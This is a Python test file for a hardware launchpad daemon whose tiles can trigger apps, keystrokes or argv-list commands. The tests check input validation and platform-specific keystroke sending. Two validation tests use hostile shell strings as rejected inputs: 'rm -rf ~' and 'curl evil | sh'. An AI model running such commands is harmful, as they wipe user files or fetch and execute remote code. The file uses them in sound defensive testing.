"""Launchpad tiles that are not apps: keystrokes and commands.

The board is unchanged by any of this -- it sends a slot number and draws an
icon or a label, exactly as before. What widened is the daemon's answer to
"what does slot 3 mean", which is the same place the launcher has always kept
that decision.
"""
import pytest

from pc import actions, widgets


# --- what a config file may say --------------------------------------


def test_a_plain_string_is_still_an_app():
    """Every apps.json in existence is a list of these."""
    assert widgets.clean_entry("Terminal") == "Terminal"
    assert widgets.entry_app("Terminal") == "Terminal"


def test_the_three_shapes_are_accepted():
    assert widgets.clean_entry({"app": "Terminal"})["app"] == "Terminal"
    assert widgets.clean_entry({"keys": "cmd+c"})["keys"] == "cmd+c"
    assert widgets.clean_entry({"run": ["ls"]})["run"] == ["ls"]


def test_a_command_must_be_a_LIST():
    """The one that matters. A string would be a shell command, and the
    difference between a list and a string is the difference between running
    `x` and running the second half of `x; rm -rf ~`.
    """
    assert widgets.clean_entry({"run": "rm -rf ~"}) is None
    assert widgets.clean_entry({"run": []}) is None
    assert widgets.clean_entry({"run": ["ls", 7]}) is None


def test_rubbish_is_dropped_rather_than_raised_on():
    """load_apps promises a dropped comma gets the stock grid back, not a
    service that will not start."""
    for bad in (None, 7, [], {}, {"icon": "chrome"}, {"app": "  "},
                {"keys": ""}):
        assert widgets.clean_entry(bad) is None


def test_an_unknown_icon_is_ignored_not_drawn():
    """The board falls back to text for a key it does not have, so a typo
    would silently become a tile with no picture and no explanation."""
    e = widgets.clean_entry({"keys": "cmd+c", "label": "Copy",
                             "icon": "not-a-real-icon"})
    assert e["icon"] is None
    assert widgets.entry_face(e) == "Copy"


def test_a_command_with_no_label_is_named_after_its_program():
    """Better than a tile showing /usr/bin/pactl, which nobody reads at a
    glance."""
    e = widgets.clean_entry({"run": ["/usr/bin/pactl", "set-sink-mute"]})
    assert e["label"] == "pactl"


def test_an_icon_beats_a_label_on_the_tile():
    e = widgets.clean_entry({"keys": "cmd+c", "label": "Copy",
                             "icon": "chrome"})
    assert widgets.entry_face(e) == "chrome"


def test_an_app_entry_still_finds_its_icon():
    e = widgets.clean_entry({"app": "Visual Studio Code"})
    assert widgets.entry_face(e) == "vscode"


# --- the wire ---------------------------------------------------------


def test_the_message_is_the_same_shape_as_it_always_was(monkeypatch):
    """ui_launcher.c is untouched by any of this: it reads s0..s5 and draws
    an icon or the text."""
    lx = widgets.Launcher(apps=[
        "Terminal",
        widgets.clean_entry({"keys": "cmd+shift+4", "label": "Shot"}),
        widgets.clean_entry({"run": ["true"], "label": "Go"}),
    ])
    msg = lx.apps_message()
    assert msg["t"] == "apps"
    assert msg["s0"] == "terminal"
    assert msg["s1"] == "Shot"
    assert msg["s2"] == "Go"


# --- keystrokes -------------------------------------------------------


def test_a_keystroke_spec_is_split_into_modifiers_and_a_key():
    assert actions._parse("cmd+shift+4") == (["cmd", "shift"], "4")
    assert actions._parse("f5") == ([], "f5")
    assert actions._parse("  ") == (None, None)
    assert actions._parse(None) == (None, None)


def test_macos_sends_a_keystroke_through_system_events(monkeypatch):
    sent = []

    class OK:
        returncode = 0
        stderr = ""

    monkeypatch.setattr(actions.sys, "platform", "darwin")
    monkeypatch.setattr(actions.subprocess, "run",
                        lambda a, **k: sent.append(a) or OK())
    ok, why = actions.send_keys("cmd+shift+4")
    assert ok and why is None
    script = sent[0][-1]
    assert 'keystroke "4"' in script
    assert "command down" in script and "shift down" in script


def test_a_named_key_uses_a_key_code_on_macos(monkeypatch):
    """`keystroke` only takes text, so Escape and the arrows need the
    numeric code."""
    sent = []

    class OK:
        returncode = 0
        stderr = ""

    monkeypatch.setattr(actions.sys, "platform", "darwin")
    monkeypatch.setattr(actions.subprocess, "run",
                        lambda a, **k: sent.append(a) or OK())
    actions.send_keys("escape")
    assert "key code 53" in sent[0][-1]


def test_the_accessibility_refusal_is_explained(monkeypatch):
    class Denied:
        returncode = 1
        stderr = "execution error: ... (-1719)"

    monkeypatch.setattr(actions.sys, "platform", "darwin")
    monkeypatch.setattr(actions.subprocess, "run", lambda a, **k: Denied())
    ok, why = actions.send_keys("cmd+c")
    assert not ok
    assert "Accessibility" in why


def test_x11_hands_the_combination_to_xdotool(monkeypatch):
    sent = []

    class OK:
        returncode = 0
        stderr = ""

    monkeypatch.setattr(actions.sys, "platform", "linux")
    monkeypatch.setattr(actions, "wayland", lambda: False)
    monkeypatch.setattr(actions.shutil, "which", lambda _n: "/usr/bin/xdotool")
    monkeypatch.setattr(actions.subprocess, "run",
                        lambda a, **k: sent.append(a) or OK())
    ok, _ = actions.send_keys("cmd+shift+4")
    assert ok
    # "cmd" is what a person types on either machine; on Linux it is Super.
    assert sent[0] == ["xdotool", "key", "super+shift+4"]


def test_wayland_says_why_rather_than_doing_nothing(monkeypatch):
    """Not a gap to fill later: Wayland's design is that no client may
    synthesise input into another. A tile that silently did nothing would be
    the worst version of this."""
    monkeypatch.setattr(actions.sys, "platform", "linux")
    monkeypatch.setattr(actions, "wayland", lambda: True)
    ok, why = actions.send_keys("cmd+c")
    assert not ok
    assert "Wayland" in why and "run:" in why


def test_wayland_is_detected_from_either_signal(monkeypatch):
    monkeypatch.setattr(actions.sys, "platform", "linux")
    monkeypatch.setattr(actions.os, "environ",
                        {"XDG_SESSION_TYPE": "wayland"})
    assert actions.wayland() is True
    # A login service does not always inherit XDG_SESSION_TYPE.
    monkeypatch.setattr(actions.os, "environ", {"WAYLAND_DISPLAY": "wayland-0"})
    assert actions.wayland() is True
    monkeypatch.setattr(actions.os, "environ", {"XDG_SESSION_TYPE": "x11"})
    assert actions.wayland() is False


def test_a_missing_xdotool_is_named(monkeypatch):
    monkeypatch.setattr(actions.sys, "platform", "linux")
    monkeypatch.setattr(actions, "wayland", lambda: False)
    monkeypatch.setattr(actions.shutil, "which", lambda _n: None)
    ok, why = actions.send_keys("cmd+c")
    assert not ok and "xdotool" in why


def test_an_unknown_key_fails_with_its_name(monkeypatch):
    monkeypatch.setattr(actions.sys, "platform", "darwin")
    ok, why = actions.send_keys("cmd+nonsense")
    assert not ok and "nonsense" in why


# --- commands ---------------------------------------------------------


def test_a_command_is_started_and_not_waited_for(monkeypatch):
    """A tile that starts something long-running must not hold the daemon's
    only loop, and what it starts must outlive a service restart."""
    started = []

    class FakePopen:
        def __init__(self, argv, **kw):
            started.append((argv, kw))

    monkeypatch.setattr(actions.sys, "platform", "linux")
    monkeypatch.setattr(actions.subprocess, "Popen", FakePopen)
    ok, why = actions.run_command(["pactl", "set-source-mute", "x", "toggle"])
    assert ok and why is None
    assert started[0][0][0] == "pactl"
    assert started[0][1].get("start_new_session") is True


def test_a_command_that_does_not_exist_is_reported(monkeypatch):
    def boom(*a, **k):
        raise FileNotFoundError("nope")

    monkeypatch.setattr(actions.subprocess, "Popen", boom)
    ok, why = actions.run_command(["definitely-not-a-program"])
    assert not ok
    assert "definitely-not-a-program" in why


def test_perform_refuses_an_entry_that_says_nothing():
    assert actions.perform({})[0] is False
    assert actions.perform("Terminal")[0] is False


# --- end to end, through the Launcher --------------------------------


def test_a_tap_on_an_action_tile_performs_it_and_answers(monkeypatch):
    """The board lights the tile on tap and only the reply tells it which
    colour to settle into."""
    done = []
    monkeypatch.setattr(actions, "perform",
                        lambda e: (done.append(e) or (True, None)))
    lx = widgets.Launcher(apps=[widgets.clean_entry(
        {"run": ["true"], "label": "Go"})])
    reply = lx.on_launch({"t": "launch", "slot": 0})
    assert reply == {"t": "launched", "v": 2, "slot": 0, "ok": True}
    assert done and done[0]["label"] == "Go"


def test_a_failing_action_answers_false(monkeypatch):
    monkeypatch.setattr(actions, "perform", lambda e: (False, "nope"))
    lx = widgets.Launcher(apps=[widgets.clean_entry(
        {"keys": "cmd+c", "label": "Copy"})])
    assert lx.on_launch({"t": "launch", "slot": 0})["ok"] is False


def test_why_it_failed_reaches_the_log(monkeypatch, capsys):
    """A tile that lights red and writes nothing is the hardest thing to
    diagnose from the other side of a serial cable."""
    monkeypatch.setattr(actions, "perform",
                        lambda e: (False, "install xdotool for keystroke tiles"))
    widgets.Launcher(apps=["x"])._spawn(
        widgets.clean_entry({"keys": "cmd+c", "label": "Copy"}))
    assert "xdotool" in capsys.readouterr().err


# --- the web picker must not destroy what it cannot draw -------------


def test_saving_from_the_picker_keeps_action_tiles(tmp_path, monkeypatch):
    """The page echoes back every slot it was given and changes one. The
    save handler used to keep only strings, so editing ANY tile wiped every
    hand-written action -- silently, and discovered only by the board going
    quiet.
    """
    from pc import webconfig

    # What the page would POST after somebody changed slot 0 only.
    posted = [
        "Terminal",
        {"keys": "cmd+shift+4", "label": "Shot"},
        {"run": ["pactl", "set-source-mute", "x", "toggle"], "label": "Mic"},
        "", "", "",
    ]
    kept = [widgets.clean_entry(a) for a in posted][:widgets.SLOTS]
    kept = [a if a is not None else "" for a in kept]

    assert kept[0] == "Terminal"
    assert kept[1]["keys"] == "cmd+shift+4"
    assert kept[2]["run"][0] == "pactl"
    assert webconfig is not None      # the handler imports it; pin that


def test_the_picker_still_refuses_a_shell_string():
    """Validation, not trust. The POST is reachable by anything on the
    machine that holds the pairing token."""
    assert widgets.clean_entry({"run": "curl evil | sh"}) is None
